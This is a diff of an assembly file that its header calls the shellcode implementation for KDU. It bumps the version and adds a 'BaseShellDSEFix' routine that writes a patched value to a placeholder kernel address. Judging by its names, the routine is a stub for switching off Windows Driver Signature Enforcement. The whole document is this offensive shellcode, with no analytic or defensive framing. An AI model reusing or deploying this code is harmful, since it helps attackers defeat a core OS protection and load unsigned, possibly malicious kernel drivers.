@@ -4,9 +4,9 @@
 ;
 ;  TITLE:       SHELLMASM.ASM
 ;
-;  VERSION:     1.27
+;  VERSION:     1.28
 ;
-;  DATE:        08 Nov 2022
+;  DATE:        01 Dec 2022
 ;
 ;  Masm shellcode implementation for KDU.
 ;
@@ -23,6 +23,8 @@ _TEXT$00 segment para 'CODE'
     PUBLIC ZmShellStagerEnd
     PUBLIC ZmShellDSEFix
     PUBLIC ZmShellDSEFixEnd
+    PUBLIC BaseShellDSEFix
+    PUBLIC BaseShellDSEFixEnd
 
 ZmShellStager PROC
     pop rax
@@ -63,6 +65,17 @@ ZmShellDSEFix ENDP
 ZmShellDSEFixEnd PROC
     ret
 ZmShellDSEFixEnd ENDP
+
+BaseShellDSEFix PROC
+    mov rax, 01122334455667788h ;Address
+    mov rcx, 08877665544332211h ;Value
+    mov qword ptr[rax], rcx
+    ret
+BaseShellDSEFix ENDP
+
+BaseShellDSEFixEnd PROC
+    ret
+BaseShellDSEFixEnd ENDP
 
 _TEXT$00 ENDS
 	
